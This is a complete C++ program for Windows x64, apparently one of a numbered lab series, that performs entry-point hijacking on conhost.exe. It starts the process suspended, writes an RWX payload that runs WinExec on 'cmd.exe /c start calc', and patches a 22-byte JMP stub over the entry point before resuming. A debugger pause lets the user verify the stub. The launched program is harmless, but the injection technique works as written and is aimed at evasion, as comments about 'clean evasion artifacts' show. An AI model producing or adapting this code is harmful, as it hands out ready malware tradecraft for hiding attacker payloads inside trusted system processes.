#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// 1. Define dynamic function pointers for absolute addressing to achieve PIC position independence
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Absolute address of WinExec on target process RAM
    char szCommand[32];       // Functional payload command string
} THREAD_DATA, * PTHREAD_DATA;

// 2. Position-Independent function to execute inside the target process context
DWORD WINAPI RemoteEntryPointPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Execute via absolute function pointer, bypassing RIP-relative boundaries
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Adaptive dynamic system directory resolution logic (Zero Static Buffers)
std::wstring GetActiveSystemPath(const std::wstring& exeName) {
    // Step 1: Query with NULL pointer to let the OS calculate the exact memory footprint required
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Step 2: Dynamically allocate space matching the byte size calculated by the OS
    std::vector<wchar_t> buffer(requiredSize);
    if (GetSystemDirectoryW(buffer.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(buffer.data());
    finalPath += L"\\" + exeName; // Mathematical string concatenation for target process target
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 10: ENTRYPOINT HIJACKING (CONHOST.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    // STAGE 1: Target dynamic Win32 native binary inside System32 to bypass redirection
    std::wstring targetExe = L"conhost.exe";
    std::wstring dynamicPath = GetActiveSystemPath(targetExe);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Failed to resolve active system path dynamically!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Host process path resolved: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // STEP 1: Initialize the host process context in a legitimate CREATE_SUSPENDED state
    std::cout << "[*] Launching host process in suspended state..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Freeze main thread execution at system initialization boundary
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Failed to create suspended process! Error code: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Host process spawned successfully with PID: " << std::dec << pi.dwProcessId << std::endl;

    // STEP 2: Extract register context and locate target process EntryPoint dynamically
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);

    // Read the remote ImageBaseAddress from the PEB block via the Rdx register on x64 architecture
    PVOID baseAddress = NULL;
    ReadProcessMemory(pi.hProcess, (PVOID)(context.Rdx + 0x10), &baseAddress, sizeof(PVOID), NULL);
    std::cout << "[+] Target ImageBaseAddress extracted from PEB: 0x" << std::hex << baseAddress << std::endl;

    // Parse the remote DOS and NT Headers to extract the raw AddressOfEntryPoint RVA
    BYTE headersBuffer[4096];
    if (!ReadProcessMemory(pi.hProcess, baseAddress, headersBuffer, sizeof(headersBuffer), NULL)) {
        std::cerr << "[-] Failed to read PE Headers from remote memory layout!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    // x64 SYNC: Cast explicitly to 64-bit NT Header variant for exact pointer calculation
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);

    // Compute the absolute target memory address for the native AddressOfEntryPoint hijacking
    PVOID entryPointAddress = (PVOID)((ULONG_PTR)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] Absolute EntryPoint target located at: 0x" << std::hex << entryPointAddress << std::endl;

    // Adaptively scale memory footprint kịch trần (Zero Static Buffers)
    SIZE_T functionSize = 500;

    // STEP 3: Allocate clean cross-process memory space inside host for payloads
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx operations inside host memory layout failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Remote Code execution segment initialized at: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // STEP 4: Package structural metadata payload and marshal cross-process boundaries
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)RemoteEntryPointPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // STEP 5: Patch the inline control flow hijacking mechanism at native EntryPoint
    DWORD oldProtect = 0;
    std::cout << "[*] Unlocking protection permissions at EntryPoint location..." << std::endl;
    if (VirtualProtectEx(pi.hProcess, entryPointAddress, 32, PAGE_EXECUTE_READWRITE, &oldProtect)) {

        // 22-byte absolute control flow redirection vector for x64 architecture
        unsigned char jmpStub[] = {
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0 (Struct pointer)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0 (Code pointer)
            0xFF, 0xE0                                                  // jmp rax
        };

        // Inject the absolute virtual address runtime parameters into the shellcode block
        *(DWORD_PTR*)(jmpStub + 2) = (DWORD_PTR)pRemoteData;
        *(DWORD_PTR*)(jmpStub + 12) = (DWORD_PTR)remoteCodeBuffer;

        // Perform inline stomping directly onto the native entry address vector
        WriteProcessMemory(pi.hProcess, entryPointAddress, jmpStub, sizeof(jmpStub), NULL);

        // Restore baseline page attributes to finalize clean evasion artifacts
        VirtualProtectEx(pi.hProcess, entryPointAddress, 32, oldProtect, &oldProtect);
        std::cout << "[+] Inline JMP Stub successfully mapped onto the native EntryPoint vector!" << std::endl;
    }
    else {
        std::cerr << "[-] Failed to modify page attributes at target EntryPoint location!" << std::endl;
    }

    // ─── STAGE 2: VERIFICATION PAUSE BLOCK ───
    std::cout << "\n====================================================" << std::endl;
    std::cout << "[*] STAGE 2 VERIFICATION: Target process frozen via CREATE_SUSPENDED." << std::endl;
    std::cout << "[*] 1. Open x64dbg now." << std::endl;
    std::cout << "[*] 2. Attach to PID: " << std::dec << pi.dwProcessId << std::endl;
    std::cout << "[*] 3. Press Ctrl+G and type EntryPoint: 0x" << std::hex << entryPointAddress << std::endl;
    std::cout << "[*] 4. Verify the mapped 22-byte JMP stub layout, then DETACH x64dbg." << std::endl;
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] Press Enter HERE only AFTER you have finalized x64dbg verification..." << std::endl;
    std::cin.get();

    // STEP 6: Revive main execution thread context to trigger payload chain execution
    std::cout << "[*] Triggering ResumeThread execution vector..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n[+] EntryPoint Hijacking Process Finalized Successfully!" << std::endl;

    // Clean up handles to mitigate memory leaks
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}